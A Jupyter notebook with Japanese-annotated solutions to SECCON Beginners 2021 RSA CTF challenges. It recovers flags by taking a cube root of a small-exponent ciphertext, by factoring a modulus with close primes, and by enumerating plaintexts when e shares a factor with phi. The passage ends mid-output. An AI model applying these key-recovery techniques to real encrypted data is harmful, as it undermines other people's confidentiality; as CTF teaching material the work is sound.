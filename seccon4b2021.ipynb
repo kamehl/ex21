{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "seccon4b2021.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "mount_file_id": "1d2TedxO5WHLxBIokQhrrpDz6jg1Hr0ZI",
      "authorship_tag": "ABX9TyM2lQgN9AhldumxENPk1zLZ",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/kamehl/ex21/blob/main/seccon4b2021.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "oWdHvf9lsRnP"
      },
      "source": [
        "#crypto"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "9Fu4vQppsBpY"
      },
      "source": [
        "##simple RSA"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "6A40VOiZ3KB_"
      },
      "source": [
        "大きな数の三乗根の計算が必要"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "RmjmT8gCs5-q",
        "outputId": "e3c8f9fa-0e9f-43f1-b9a9-e3601dfaa92d"
      },
      "source": [
        "!apt-get install libgmp-dev libmpfr-dev libmpc-dev"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Reading package lists... Done\n",
            "Building dependency tree       \n",
            "Reading state information... Done\n",
            "The following package was automatically installed and is no longer required:\n",
            "  libnvidia-common-460\n",
            "Use 'apt autoremove' to remove it.\n",
            "The following additional packages will be installed:\n",
            "  libgmpxx4ldbl\n",
            "Suggested packages:\n",
            "  gmp-doc libgmp10-doc libmpfr-doc\n",
            "The following NEW packages will be installed:\n",
            "  libgmp-dev libgmpxx4ldbl libmpc-dev libmpfr-dev\n",
            "0 upgraded, 4 newly installed, 0 to remove and 34 not upgraded.\n",
            "Need to get 625 kB of archives.\n",
            "After this operation, 3,178 kB of additional disk space will be used.\n",
            "Get:1 http://archive.ubuntu.com/ubuntu bionic/main amd64 libgmpxx4ldbl amd64 2:6.1.2+dfsg-2 [8,964 B]\n",
            "Get:2 http://archive.ubuntu.com/ubuntu bionic/main amd64 libgmp-dev amd64 2:6.1.2+dfsg-2 [316 kB]\n",
            "Get:3 http://archive.ubuntu.com/ubuntu bionic/main amd64 libmpfr-dev amd64 4.0.1-1 [249 kB]\n",
            "Get:4 http://archive.ubuntu.com/ubuntu bionic/main amd64 libmpc-dev amd64 1.1.0-1 [50.5 kB]\n",
            "Fetched 625 kB in 1s (839 kB/s)\n",
            "Selecting previously unselected package libgmpxx4ldbl:amd64.\n",
            "(Reading database ... 160706 files and directories currently installed.)\n",
            "Preparing to unpack .../libgmpxx4ldbl_2%3a6.1.2+dfsg-2_amd64.deb ...\n",
            "Unpacking libgmpxx4ldbl:amd64 (2:6.1.2+dfsg-2) ...\n",
            "Selecting previously unselected package libgmp-dev:amd64.\n",
            "Preparing to unpack .../libgmp-dev_2%3a6.1.2+dfsg-2_amd64.deb ...\n",
            "Unpacking libgmp-dev:amd64 (2:6.1.2+dfsg-2) ...\n",
            "Selecting previously unselected package libmpfr-dev:amd64.\n",
            "Preparing to unpack .../libmpfr-dev_4.0.1-1_amd64.deb ...\n",
            "Unpacking libmpfr-dev:amd64 (4.0.1-1) ...\n",
            "Selecting previously unselected package libmpc-dev:amd64.\n",
            "Preparing to unpack .../libmpc-dev_1.1.0-1_amd64.deb ...\n",
            "Unpacking libmpc-dev:amd64 (1.1.0-1) ...\n",
            "Setting up libgmpxx4ldbl:amd64 (2:6.1.2+dfsg-2) ...\n",
            "Setting up libgmp-dev:amd64 (2:6.1.2+dfsg-2) ...\n",
            "Setting up libmpfr-dev:amd64 (4.0.1-1) ...\n",
            "Setting up libmpc-dev:amd64 (1.1.0-1) ...\n",
            "Processing triggers for libc-bin (2.27-3ubuntu1.2) ...\n",
            "/sbin/ldconfig.real: /usr/local/lib/python3.7/dist-packages/ideep4py/lib/libmkldnn.so.0 is not a symbolic link\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "OfIiaRsIsWKg",
        "outputId": "ef5fe587-8321-453f-92ea-331642c45348"
      },
      "source": [
        "!pip install gmpy2"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Collecting gmpy2\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/90/f4/9a2e384b325b69bc5827b9a6510a8fb4a51698c915c06a3f25a86458892a/gmpy2-2.0.8.zip (280kB)\n",
            "\r\u001b[K     |█▏                              | 10kB 16.7MB/s eta 0:00:01\r\u001b[K     |██▍                             | 20kB 9.9MB/s eta 0:00:01\r\u001b[K     |███▌                            | 30kB 6.1MB/s eta 0:00:01\r\u001b[K     |████▊                           | 40kB 5.6MB/s eta 0:00:01\r\u001b[K     |█████▉                          | 51kB 2.9MB/s eta 0:00:01\r\u001b[K     |███████                         | 61kB 3.2MB/s eta 0:00:01\r\u001b[K     |████████▏                       | 71kB 3.5MB/s eta 0:00:01\r\u001b[K     |█████████▍                      | 81kB 3.7MB/s eta 0:00:01\r\u001b[K     |██████████▌                     | 92kB 3.8MB/s eta 0:00:01\r\u001b[K     |███████████▊                    | 102kB 4.0MB/s eta 0:00:01\r\u001b[K     |████████████▉                   | 112kB 4.0MB/s eta 0:00:01\r\u001b[K     |██████████████                  | 122kB 4.0MB/s eta 0:00:01\r\u001b[K     |███████████████▏                | 133kB 4.0MB/s eta 0:00:01\r\u001b[K     |████████████████▍               | 143kB 4.0MB/s eta 0:00:01\r\u001b[K     |█████████████████▌              | 153kB 4.0MB/s eta 0:00:01\r\u001b[K     |██████████████████▊             | 163kB 4.0MB/s eta 0:00:01\r\u001b[K     |███████████████████▉            | 174kB 4.0MB/s eta 0:00:01\r\u001b[K     |█████████████████████           | 184kB 4.0MB/s eta 0:00:01\r\u001b[K     |██████████████████████▏         | 194kB 4.0MB/s eta 0:00:01\r\u001b[K     |███████████████████████▍        | 204kB 4.0MB/s eta 0:00:01\r\u001b[K     |████████████████████████▌       | 215kB 4.0MB/s eta 0:00:01\r\u001b[K     |█████████████████████████▊      | 225kB 4.0MB/s eta 0:00:01\r\u001b[K     |██████████████████████████▉     | 235kB 4.0MB/s eta 0:00:01\r\u001b[K     |████████████████████████████    | 245kB 4.0MB/s eta 0:00:01\r\u001b[K     |█████████████████████████████▏  | 256kB 4.0MB/s eta 0:00:01\r\u001b[K     |██████████████████████████████▍ | 266kB 4.0MB/s eta 0:00:01\r\u001b[K     |███████████████████████████████▌| 276kB 4.0MB/s eta 0:00:01\r\u001b[K     |████████████████████████████████| 286kB 4.0MB/s \n",
            "\u001b[?25hBuilding wheels for collected packages: gmpy2\n",
            "  Building wheel for gmpy2 (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for gmpy2: filename=gmpy2-2.0.8-cp37-cp37m-linux_x86_64.whl size=457753 sha256=221f422f9ab601d98f577e90fa80c0e0d0a27005efe7982249be08096f75b868\n",
            "  Stored in directory: /root/.cache/pip/wheels/33/5a/45/b4f58933bc61064f49669220932d1d5bcc0b2a1f762f25ac0e\n",
            "Successfully built gmpy2\n",
            "Installing collected packages: gmpy2\n",
            "Successfully installed gmpy2-2.0.8\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Tbq7Kef4sfe9"
      },
      "source": [
        "import gmpy2"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "d_NuFV_wtJ1c",
        "outputId": "fbce6159-32ec-44ae-8555-5762a87494a2"
      },
      "source": [
        "c =213791751530017111508691084168363024686878057337971319880256924185393737150704342725042841488547315925971960389230453332319371876092968032513149023976287158698990251640298360876589330810813199260879441426084508864252450551111064068694725939412142626401778628362399359107132506177231354040057205570428678822068599327926328920350319336256613\n",
        "m = int(gmpy2.iroot(c, 3)[0])\n",
        "flag = m.to_bytes((m.bit_length()+7)//8, 'big').decode()\n",
        "\n",
        "print(flag)\n"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "ctf4b{0,1,10,11...It's_so_annoying.___I'm_done}\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "oulJ30LuSRld"
      },
      "source": [
        "##p-8RSA\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "ZbQp2eul3h8P"
      },
      "source": [
        "素数*p*、*q*の値が近いという脆弱性がある。\n",
        "\n",
        ">$q=x+i$\n",
        "\n",
        ">$p=x-i$\n",
        "\n",
        "とすると\n",
        "\n",
        ">$n=p\\times q=\\left(x-i\\right)\\times\\left(x+i\\right)=x^{2}-i^{2}$\n",
        "\n",
        "と書けるので\n",
        "\n",
        ">$n+i^{2}$\n",
        "\n",
        "が整数の平方根となるような整数*i*を探す問題（*p*と*q*が近いと*i*が簡単に見つかる）\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "XfsedEOvS6OA"
      },
      "source": [
        "import gmpy2"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "25tZcKOATLyT"
      },
      "source": [
        "n = 169221770188000341507764005330769042705223611712308424479120192596136318818708135716157255550936563268500310852894489839470320516645317338473018150885997977008925839939560590924435380239519554475266121835753044660177349444503693993991253475530436734034224314165897550185719665717183285653938232013807360458249"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "nwKGVRxWTSUi",
        "outputId": "362154a8-ad02-4f1e-e3d8-63e2e5abeb46"
      },
      "source": [
        "for i in range(10000):\n",
        "  m = n + i * i\n",
        "  x, f = gmpy2.iroot(m, 2)\n",
        "  if f:\n",
        "    print(\"x=\", x)\n",
        "    print(\"i=\",i)\n",
        "    break"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "x= 13008526826201356667891590694678121516071641430494347349438757349219893000439927852950504383765791466428599814640460028507882213264934492728368742844734365\n",
            "i= 7176\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "cCkBuki0Yuzj",
        "outputId": "c735914d-ad85-4c6f-addf-b024098b37e8"
      },
      "source": [
        "q = x + i\n",
        "p = x - i\n",
        "\n",
        "n - p*q"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "mpz(0)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 9
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "hG9XAysM8t4s"
      },
      "source": [
        "*p*と*q*がもとまったので、秘密鍵*d*が計算できる"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ch9dej0dZ4f5",
        "outputId": "5b7730b1-a694-4b34-a344-7550c2ec9a45"
      },
      "source": [
        "!pip install pycrypto"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Collecting pycrypto\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/60/db/645aa9af249f059cc3a368b118de33889219e0362141e75d4eaf6f80f163/pycrypto-2.6.1.tar.gz (446kB)\n",
            "\r\u001b[K     |▊                               | 10kB 11.4MB/s eta 0:00:01\r\u001b[K     |█▌                              | 20kB 16.5MB/s eta 0:00:01\r\u001b[K     |██▏                             | 30kB 19.0MB/s eta 0:00:01\r\u001b[K     |███                             | 40kB 15.9MB/s eta 0:00:01\r\u001b[K     |███▊                            | 51kB 8.2MB/s eta 0:00:01\r\u001b[K     |████▍                           | 61kB 9.4MB/s eta 0:00:01\r\u001b[K     |█████▏                          | 71kB 8.0MB/s eta 0:00:01\r\u001b[K     |█████▉                          | 81kB 8.8MB/s eta 0:00:01\r\u001b[K     |██████▋                         | 92kB 8.8MB/s eta 0:00:01\r\u001b[K     |███████▍                        | 102kB 7.7MB/s eta 0:00:01\r\u001b[K     |████████                        | 112kB 7.7MB/s eta 0:00:01\r\u001b[K     |████████▉                       | 122kB 7.7MB/s eta 0:00:01\r\u001b[K     |█████████▌                      | 133kB 7.7MB/s eta 0:00:01\r\u001b[K     |██████████▎                     | 143kB 7.7MB/s eta 0:00:01\r\u001b[K     |███████████                     | 153kB 7.7MB/s eta 0:00:01\r\u001b[K     |███████████▊                    | 163kB 7.7MB/s eta 0:00:01\r\u001b[K     |████████████▌                   | 174kB 7.7MB/s eta 0:00:01\r\u001b[K     |█████████████▏                  | 184kB 7.7MB/s eta 0:00:01\r\u001b[K     |██████████████                  | 194kB 7.7MB/s eta 0:00:01\r\u001b[K     |██████████████▊                 | 204kB 7.7MB/s eta 0:00:01\r\u001b[K     |███████████████▍                | 215kB 7.7MB/s eta 0:00:01\r\u001b[K     |████████████████▏               | 225kB 7.7MB/s eta 0:00:01\r\u001b[K     |█████████████████               | 235kB 7.7MB/s eta 0:00:01\r\u001b[K     |█████████████████▋              | 245kB 7.7MB/s eta 0:00:01\r\u001b[K     |██████████████████▍             | 256kB 7.7MB/s eta 0:00:01\r\u001b[K     |███████████████████             | 266kB 7.7MB/s eta 0:00:01\r\u001b[K     |███████████████████▉            | 276kB 7.7MB/s eta 0:00:01\r\u001b[K     |████████████████████▋           | 286kB 7.7MB/s eta 0:00:01\r\u001b[K     |█████████████████████▎          | 296kB 7.7MB/s eta 0:00:01\r\u001b[K     |██████████████████████          | 307kB 7.7MB/s eta 0:00:01\r\u001b[K     |██████████████████████▊         | 317kB 7.7MB/s eta 0:00:01\r\u001b[K     |███████████████████████▌        | 327kB 7.7MB/s eta 0:00:01\r\u001b[K     |████████████████████████▎       | 337kB 7.7MB/s eta 0:00:01\r\u001b[K     |█████████████████████████       | 348kB 7.7MB/s eta 0:00:01\r\u001b[K     |█████████████████████████▊      | 358kB 7.7MB/s eta 0:00:01\r\u001b[K     |██████████████████████████▍     | 368kB 7.7MB/s eta 0:00:01\r\u001b[K     |███████████████████████████▏    | 378kB 7.7MB/s eta 0:00:01\r\u001b[K     |████████████████████████████    | 389kB 7.7MB/s eta 0:00:01\r\u001b[K     |████████████████████████████▋   | 399kB 7.7MB/s eta 0:00:01\r\u001b[K     |█████████████████████████████▍  | 409kB 7.7MB/s eta 0:00:01\r\u001b[K     |██████████████████████████████  | 419kB 7.7MB/s eta 0:00:01\r\u001b[K     |██████████████████████████████▉ | 430kB 7.7MB/s eta 0:00:01\r\u001b[K     |███████████████████████████████▋| 440kB 7.7MB/s eta 0:00:01\r\u001b[K     |████████████████████████████████| 450kB 7.7MB/s \n",
            "\u001b[?25hBuilding wheels for collected packages: pycrypto\n",
            "  Building wheel for pycrypto (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for pycrypto: filename=pycrypto-2.6.1-cp37-cp37m-linux_x86_64.whl size=499931 sha256=13aa5b09a75b3bdcb4cc4646dfc01e55a322b9144bae033aa5e122df69891ba1\n",
            "  Stored in directory: /root/.cache/pip/wheels/27/02/5e/77a69d0c16bb63c6ed32f5386f33a2809c94bd5414a2f6c196\n",
            "Successfully built pycrypto\n",
            "Installing collected packages: pycrypto\n",
            "Successfully installed pycrypto-2.6.1\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "d08s6pQuZOEp",
        "outputId": "b6c5dc06-ed6d-4bcf-883e-861d3756ca98"
      },
      "source": [
        "from Crypto.Util.number import *\n",
        "\n",
        "e = 17\n",
        "c = 100233131931360278332734341652304555814094487252151131735286074616555402795190797647001889669472290770925839013131356212574455274690422113278015571750653365512998669453161955302008599029919101244702933443124944274359143831492874463245444294673660944786888148517110942002726017336219552279179125115273728023902\n",
        "\n",
        "d = inverse(e, (p-1)*(q-1))\n",
        "\n",
        "print(d)\n",
        "k"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "1\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "omh6Pz_Ko44P"
      },
      "source": [
        "？？\n",
        "\n",
        "*e*と$（p-1）\\times （q-1）$が「互いに素」になっていない\n",
        "\n",
        "よって、モジュラ逆数が計算できないため秘密鍵*d*が計算できない\n",
        "\n",
        "<a href=\"https://y011d4.netlify.app/20201026-not-coprime-e-phi/\">ここ</a>によると、次の条件を満たす場合は平文の候補を*e*個以下に絞ることができるらしい\n",
        "\n",
        "1.   *e*が素数\n",
        "2.   $p-1$が*e*で１回だけ割り切れる\n",
        "3.   $q-1$は*e*で割り切れない\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "D3y_9a9ZjDL9",
        "outputId": "2bb6a6ad-3241-4ae3-d07e-3e1e3a15a079"
      },
      "source": [
        "print(isPrime(e))\n",
        "print((q-1)%e)\n",
        "print((q-1)%e**2)\n",
        "print((p-1)%e)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "1\n",
            "0\n",
            "153\n",
            "4\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "NpfRQjxXrAUO"
      },
      "source": [
        "平文*m*は次のうちのいずれか\n",
        "\n",
        ">$m = c^{d} \\times L^{i} \\bmod \\left( n \\right) $\n",
        "\n",
        "ただし　$0 < i \\leq e$\n",
        "\n",
        ">$d = e^{-1} \\bmod \\left( \\lambda /e \\right)$\n",
        "\n",
        ">$L = x^{\\lambda /e}$\n",
        "\n",
        ">$\\begin{split}\n",
        "\\lambda &= lcm\\left( p-1, q-1 \\right) \\\\\n",
        "&= \\left( p-1 \\right) \\times  \\left( q-1 \\right) / gcd \\left( p-1, q-1 \\right)\n",
        "\\end{split}$\n",
        "\n",
        "ただし、*x*は任意の整数（今回は「２」）"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "v6Fctd9Aj9Qy",
        "outputId": "7e156d82-50e0-4fb9-f1b8-3f9bbbf623a5"
      },
      "source": [
        "# print(gmpy2.gcd(p-1, q-1))\n",
        "# print((p-1)*(q-1)//gmpy2.gcd(p-1, q-1))\n",
        "# print(gmpy2.lcm(p-1, q-1))\n",
        "# print(inverse(e, lmd//e))\n",
        "\n",
        "lmd = gmpy2.lcm(p-1, q-1)\n",
        "d = inverse(e, lmd//e)\n",
        "L = pow(2, lmd//e, n)\n",
        "\n",
        "for i in range(e):\n",
        "  flag = long_to_bytes(pow(c, d, n) * pow(L, i, n) % n)\n",
        "  print(flag)\n"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "b\"k\\x00:C\\xc1\\x04\\x88\\x8b\\x9f\\x1c\\xe5\\xeb\\x1b\\x1b\\xddX\\x93\\xd2\\xf1b\\xec\\xa4\\\\Tpo\\x9bF6-eBTB\\xfd\\xaaE\\xb4\\x87\\xd5\\x1a2P<\\x19\\x91\\x85\\xa3cf\\x93\\xa6\\\\\\xf0\\xb8hL\\xebrag\\xa3\\xfa\\x9e\\x19\\x7f?\\xbf\\x81\\xb3W\\xb2Wa\\xf5@\\x821~\\x81\\x9f^gm3L\\x8f\\r\\xe1\\xfbKND\\x1c\\xba\\xdfw\\xbf*\\xa0\\xdb1\\xa9H\\x89sC\\n\\xa1\\x8d\\xc3&\\xfb\\x86\\xdb\\xca5\\xf8\\x9c\\xef\\x8fJ'\\xd0L\\xd6a\\xd0\"\n",
            "b'\\x0c!\\xb1\\xc2\\xd9&\\xaf]s1v\\xfb\\x92\\xb6\\xc2<Dk\\x9bBr[Ffd~\\x985\\x10w]\\xb9.\\xb9/\\x95\\xdd\\x1e\\x9b\\x9e\\xbd\\xb5\\xa5\\x11\\x91$\\xc8\\x19r\\x1c\\xac\\xda:|\\x87j\\xd8\\xd5TI\\xff\\xa2\\xd6\\xc7t\"<,v\\x9f\\xb4\\x1e\\xb1i~\\x00\\xd6w\\xad2M\\x81\\xd0#p=\\xd3\\x97\\x84v\\x8a\\xb62@_b\\x0c\\xe7\\xc1\\x13\\xd3\\x085\\xd9j&-n\\x18\\'GX\\xf8Vt.dq\\x0f|\\xfah>:G::-'\n",
            "b'ctf4b{4r3_y0u_up5id3_d0wn?_Fr0m_6310w?_0r_60th?}[D@\\xd1\\x90\\t>+.a\\xf0\\x8a\\x11\\xeb\\xf9\"\\xb3fJ\\xd9\\xe4\\xe0\\xc1\\xed\\x9a\\x02\\x81\\x9b\\x1aY\\xd2r#\\xc0\\xdf;\\xc4Z\\xef\\x9cR\\xa6\\x98\\x98\\x8a$\\xbf\\x1d\\xc0I\\xf4z_j\\xc0\\xf0\\xb9\\x1f\\xdf\\xa3\\xd6O\\xaa\\xad'\n",
            "b'\\xb5B\\xb4\\x8d\\xdf\\x1e\\x1f\\xd4\\xb4\\xf4\\xbel\\xf4\\xa2\\xbb\\xb5\\xd9\\xc1\\x1b>\\x87\\xa4\\xb3m\\x94\\x96\\x1b@#\\x9c=\\xea\\xc02z\\xc6K\\x047$\\xb5e\\x05\\x19\\xa4B\\xae|P\\x01\\xe0\\xe5\\x1dN\\xf4\\x89\\x0cR\\x9c\\xef\\x9f.mu\\xa2\\xebt\\xc6\\x17\\xa4\\x08\\x87\\x11\\x92f\\xf9N\\x80@\\xd1\\x93\\x11\\x7f\\xbdZ\\x82\\xb8\\x95\\xb5h\\xf7>\\xbdKHO\\xa7\\xab\\xf55\\xdd \\xd9%\\x8a,3C\\x8c\\xfe\\x08\\xab<\\xfc\\x16\\x91\\xbf\\x0bW=*\\xbb\\xa6\\xbb\\xaa\\xb6q\\xf5'\n",
            "b'Ep\\xef\\x8e\\xf1\\xf2\\xf5\\r\\xe8v}\\xc8\\xf2JT\\x9f\\x8b\\xdf\\xbbE\\x90\\x81\\x96\\xf6\\xf0G\\x95\\xc6\\x03g&\\x8cHF\\xb4\\xe4p\\xc13\\xf1u8\\xb9b\\xd9/@ \\nt\\x88\\x11M\\xce\\x93\\xa8\\xfe\\xd3\\x04\\x88e\\x19U\\xec\\n\\x98D\\x8a\\x9a\\xef\\x97\\xdd\\xb1\\x00g\\x11\\xb5\\x9cTv\\x80\\xce(\\xd8\\xa7>\\xe5Tv\\xe0\\xc08\\x8a\\x03v\\xb3:\\x13R\\xb0T\\xb1C\\x00\\x11<\\xd7\\x8e\\xd2R\\xcd\\xd7[k\\xda\\x13\\xd9\\xe3\\x84\\xe4n\\xec\\xe0!\\x03\\\\\\x9e~'\n",
            "b\"C)\\x86JseL\\xa7\\x852\\x1a\\x19\\xa24>i\\x0e\\x98\\xed\\xe0\\xd5/\\x1ey\\xf1\\xf6\\xa4}Y\\xd8\\x07\\xc4J\\x0f\\xba\\x88\\xb43\\x1a\\x9e\\xa60\\xc0m\\x16\\x18\\x9b\\xec\\xb3\\xc8\\xbd5\\x12*w`\\x81\\x17J\\xcfH\\x89Be{`z\\x1c\\xf6\\x0f\\r<\\x7f|fm\\xb0\\x8c7S\\xca+\\xb0tZ\\x91\\x8fKz\\x8cMw\\x08\\x95L\\x9b\\xa3c\\xc0\\xb1\\xf0\\x9c\\xa4!\\xd9\\x99\\xa4\\xb9\\x1d\\xd0'\\x8d\\xc0\\xba\\xa4\\x1c\\xed\\x04\\x9f\\xf9\\x96\\xda\\xbds\\x06\\x99\\xf1s\"\n",
            "b\"\\x9f\\x0c\\x0b\\xb3\\x99~]\\x1frDW!Q\\x16\\xb97E\\xa3\\xd5\\x9b\\xad\\xbf\\xa9\\xcd?\\x98\\x9a\\xc0\\xc6\\x83\\xe1'\\x8f\\xc9a\\xfa\\xe0c\\x8b~\\xb2\\xe1\\xac\\x04\\n\\xfa\\xe1\\x91#2\\x86(\\xca+\\xef\\xaa\\xf2\\xaa\\xc6P\\x89\\xd3\\xe5\\x1b)\\xf0\\xb9\\xa3'f'\\xc3\\x92S*(\\xfa\\xcd\\xe5\\xf08\\x83\\xeb\\xa4\\x95\\xaeA\\x00\\xf8Z\\xd0k<\\xe5YV8\\x17/\\xad.L\\x06q\\xa9\\x9a\\xb5\\xb6\\xb9\\xbcj\\xe2\\\\\\xf8\\xb1s\\xc5\\xee\\x84q\\xbf\\xc4r\\x96\\xcf\\xd0\\x9a\\xd8\"\n",
            "b'\\x97Q\\xc1\\xbf.\\xb5\\xadB\\xe4,\\xff\\xac\\\\\\xf5\\xa8\\x19|\\xf9\\x02\\x9bm\\x955\\xc0\\x81\\x84}j\\x81\\x11\\xe6H\\xd5I\\xc8}*\\xea\\xf2\\x1b_\\x99\\x7f\\xa7p\\x0f\\xf3\\x9a\\xa0?d\\x12\\xb2wx\\x02b\\x1f\\xa1;\\xff\\x0fpZC\\xb2&\\x80\\xbdr\\xad\\x98\\xaf6\\xeb\\xc4\\xb3\\x921l|p\\xf2\\xe4~\\xba\\xd9c\\xde\\x14)j\\xf3f\\x14\\x7f\\xed%\\x0bp\\xf1B\"\\x18\\xc0\\xb1\\x1dq?\\xd3\\xbf\\xd9Q\\xfdv\\xc6\\xe0\\xc3\\xb8Q\\xa0\\x07\\x12\\xc6w!\\x8b\\xf1'\n",
            "b'(\\x1ew92\\x95\\x9f\\xfe\\x9c\\x0cE\\x14\\x88\\xf4\\xc7\\xc0\\x03\\xb8\\xd7\\x9d\\xcb\\x84\\x98\\xb6\\xa5<\\xb9\\x8c/\\xcc\\x8c\\xc5\\x95\\x9eA\\xb4%\\x1a\\xed\\xad\\xe7\\xd6\\xd8%r#\\xe0\\x1c\\xab\\xa6\\xc6\\x88\\x7fc\\x13i\\x1d\\x85b\\xbd#}CK\\x1a\\x85*\\x1cy\\x80\\xa9o`\\xdc\\xb6\\xdc\\xb9\\xeb\\xd5\\x8fi\\x1c\\xb8\\x10\\xdd\\xf4\\xf2\\xf7\\x91\\xdbM}|\\x0fR\\xd6\\xa8\\xbc\\xe3\\xbf\\xb2\\x8d\\xcd]\\x9e\\x0c\\x9e\\x85z\\xa4\\xe1\\xc3\\xb8\\x12^\\x07\\xb8\\xd9\\xd4\\xdb-\\x1a_R\\x04\\xa0\\xb4s'\n",
            "b\"\\x04[~\\x8d\\xd2I\\xf9\\xd7\\xe1\\xc3\\xb3\\xea\\x16A\\xb6$h\\x89\\x0f[\\xda\\xbdu\\xe54\\xe5\\x98\\xac\\x88\\x9c\\xbd\\t\\x8e<\\xcd\\x8c\\x05\\xc0\\xf0\\x11\\xabJ\\xac\\x1b\\x92\\x92\\xd8\\xec\\xe8\\xcbW\\xa2zkoCR\\xdd\\xe4\\xa5\\xd5\\x88\\xc4,\\xc9h\\xb9\\xfc\\tk\\x8d\\x96\\x8c\\xed\\x9a\\xde\\xcf}\\xa4M~l\\xba\\xfc\\xd1Q\\xf4\\xdaBa\\x1d\\xb4'E\\xc7*8\\x9a\\nv\\x8cs:\\xa1AT\\xd1\\xee\\xe0\\x912O\\xf3\\xea\\x97WS\\xeb\\x01\\xc6\\x1e\\xc0\\x06\\x03k27\\x0b\"\n",
            "b'\\xd432\\xb6\\x8c\\xebs\\x1fpZ\\x82b\\x02\\x0eV\\xc2\\x14\\xf3\\xf8\\xe8Vz[}*\\xe2\\xb7\\x99 \\x04\\xb5-\\xc4\\xc8m\\x02nL\\xcc\\xa6\\xca\\xc3\\x90x\\x9e\\xc8u\\x08 \\xce\\xd2\\x89\\x9c\\x0b\\xeb\\x8c\\x02oEI\\xb9A\\x06Nwp47\\xbd\\x9d\\x9fm\\xdc\\xba\\x17\\x12\\xc7\\xa6\\xb14E\\xd1j\\x9b\\xc2\\x85h\\x1c\\xa2\\xb5y\\xbc;\\xec\\xc1E\\x82\\x19%\\xad\\xc82\\x046\\xc0\\xda\\xa3\\xc7\\xb0\\xc7\\x89\\xe5\\x1f\\x13\\x01h\\x88&:\\xa2\\xbf#\\xcfnoUpR'\n",
            "b'xs&1z\\xde\\x97\\xe4\\xb1\\xa6V\"DK\\xc9\\x1c\\xa9\\x9f4B\\xe7(W\\x1e\\xde1h\\xe7L\\x1a0NN\\xbdT\\xebu\\xbf\\xbeA\\xf4\\xf3\\xf8\\xf7\\xd6W\\x7f\\xf6\\x7fS\\x08 \\x1e\\x9e,+)\\x15\\t\\xae\\xbf\\xfa\\x1bL,\\xbaq\\xa0l\\x8d\\x8e\\x0b\\xcb\\xcc\\xbb\\xe6\\x05\\x92\\x08^@\\xa1R\\x04\\xd1B\\'-\\xea\\x94\\x84;H5d\\xd7\\x0b>YN\\xbdFR\\xe8\\xddK\\x87\\x96\\x95\\xf7\\x97\\xd6S5,j6M\\xaf\\xad~>\\x7f\\x89\\x8f1\\x8c\\x9d'\n",
